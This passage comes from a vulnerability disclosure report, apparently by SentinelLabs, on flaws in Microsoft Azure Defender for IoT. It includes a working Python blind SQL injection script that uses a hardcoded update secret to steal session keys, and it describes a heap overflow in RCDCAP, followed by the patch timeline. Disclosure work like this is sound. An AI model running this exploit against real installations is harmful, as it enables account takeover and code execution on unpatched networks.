that secretive. This `update.token`\nis hardcoded in the file `index.properties and is shared across all Defender For IoT`\ninstallations worldwide, which means that an attacker may exploit this vulnerability without\nany authentication.\n\nWe created the following script to extract a logged in user session id from the database,\nwhich allows us to take over the account.\n\n\n-----\n\n```\nimport requests\nimport datetime\nfrom urllib3.exceptions import InsecureRequestWarning\nrequests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)\nHOST = \"https://10.100.102.253\"\ndef startAttack():\n  sessionKey = \"\"\n  for currChr in range(1, 40):\n    bitStr = \"\"\n    for currBit in range(0, 8):\n      sql = \"aleg' union select if(ord(substr((SELECT session_key from\ndjango_session WHERE LENGTH(session_data) > 70 ORDER BY expire_date DESC LIMIT 1),\n{0},1)) >>{1} & 1 = 1,sleep(3),0),2 -- a\".format(currChr, currBit)\n      body = {\n        \"update_secret\": \"93960370-2f5f-4be1-813e-b7a3768ad288\",\n        \"xsenseUID\": sql\n      }\n      now = datetime.datetime.now()\n      res = requests.post(HOST + \"/api/v1/token/update-handshake\", json=body,\nverify=False)\n      if (datetime.datetime.now() - now).seconds > 2:\n        bitStr += \"1\"\n        print(1)\n      else:\n        bitStr += \"0\"\n        print(0)\n    final = bitStr[::-1]\n    print(final)\n    print(int(final, 2))\n    chrNum = int(final, 2)\n    if not chrNum:\n      return\n    sessionKey += chr(chrNum)\n    print(\"SessionKey: \" + sessionKey)\ndef main():\n  startAttack()\nif __name__ == \"__main__\":\n  main()\n\n```\nAs with the first SQL injection vulnerability, after extracting the session id from the database,\nwe can use any of the methods mentioned above to execute code as root.\n\n## CVE-2021-37222\n\n\n-----\n\n[The sensor machine uses RCDCAP (an open source project) to open CISCO ERSPAN and](https://sourceforge.net/projects/rcdcap/)\nHP ERM encapsulated packets.\n\nThe functions `ERSPANProcessor::processImpl and` `HPERMProcessor::processImpl`\nmethods are vulnerable to a wildcopy heap based buffer overflow vulnerability, which can\npotentially allow arbitrary code execution, when processing specially crafted input.\n\nThese functions are vulnerable to a wildcopy heap based buffer overflow vulnerability, which\ncan potentially allow arbitrary code execution.\n\nThis vulnerability was found by locally fuzzing RCDCAP with pcap files and occurs when this\nline is executed:\n\n(hp-erm-processor.cc:94)\n\n(erspan-processor.cc:90)\n```\nstd::copy(&packet[offset + MACHeader802_1Q::getVLANTagOffset()],\n    &packet[caplen],\n&packet[MACHeader802_1Q::getVLANTagOffset()+MACHeader802_1Q::getVLANTagSize()]);\n\n```\n[This was reported to the code owner and MSRC; the code owner has already issued a fix:](http://hg.code.sf.net/p/rcdcap/code/rev/0af05606c55b#l2.10)\n\n\n-----\n\nMSRC, however, decided that this vulnerability does not meet the bar for a MSRC security\nupdate and the development group might decide to fix it as needed.\n\n## Impact\n\nWho is affected? Azure Defender for IoT running with unpatched systems are affected.\n[Since this product has many configurations, for example RTOS, which have not been](https://docs.microsoft.com/en-us/azure/defender-for-iot/device-builders/iot-security-azure-rtos)\ntested, users of these systems can be affected as well.\nWhat is the risk? Successful attack may lead to full network compromise, since Azure\nDefender For IoT is configured to have a TAP (Terminal Access Point) on the network\ntraffic. Access to sensitive information on the network could open a number of\nsophisticated attacking scenarios that could be difficult or impossible to detect.\n\n## Mitigation\n\nWe responsibly disclosed our findings to MSRC in June 2021, and Microsoft has released a\n[security advisory with patch details December 2021, which can be found here,](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42310) [here,](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42312) [here,](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42313)\n[here and here.](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42311)\n\nWhile we have no evidence of in-the-wild exploitation of these vulnerabilities, we further\nrecommend revoking any privileged credentials deployed to the platform before the cloud\nplatforms have been patched, and checking access logs for irregularities.\n\n## Conclusion\n\nCloud providers heavily invest in securing their platforms, but unknown zero-day\nvulnerabilities are inevitable and put customers at risk. It’s particularly concerning when it\ncomes to IoT and OT devices that have little to no defenses and depend entirely on these\nvulnerable platforms for their security posture. Cloud users should take a defense-in-depth\napproach to cloud security to ensure breaches are detected and contained, whether the\nthreat comes from the outside or from the platform itself.\n\nAs part of SentinelLabs’ commitment to advancing public security, we actively invest in\nresearch, including advanced threat modeling and vulnerability testing of cloud platforms and\nrelated technologies and widely share our findings in the interest of protecting all users.\n\n## Disclosure Timeline\n\nJune 21, 2021 – Initial report to MSRC.\nJune 24, 2021 – Initial response from MSRC\nJune 30, 2021 – MSRC requests a PoC video and code.\nJuly 1, 2021 – We shared the code and a PoC video with MSRC.\nJuly 16, 2021 – MSRC confirmed the bug and started working on a fix.\nDecember 14, 2021 – MSRC released an advisory.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-03-28 - Pwning Microsoft Azure Defender for IoT - Multiple Flaws Allow Remote Code Execution for All.pdf"
    ],
    "report_names": [
        "2022-03-28 - Pwning Microsoft Azure Defender for IoT - Multiple Flaws Allow Remote Code Execution for All.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536055,
    "ts_updated_at": 1743041125,
    "ts_creation_date": 1653693412,
    "ts_modification_date": 1653693412,
    "files": {
        "pdf": "https://archive.orkl.eu/f43953a8e0565164b9796a17453aeeb1d836557d.pdf",
        "text": "https://archive.orkl.eu/f43953a8e0565164b9796a17453aeeb1d836557d.txt",
        "img": "https://archive.orkl.eu/f43953a8e0565164b9796a17453aeeb1d836557d.jpg"
    }
}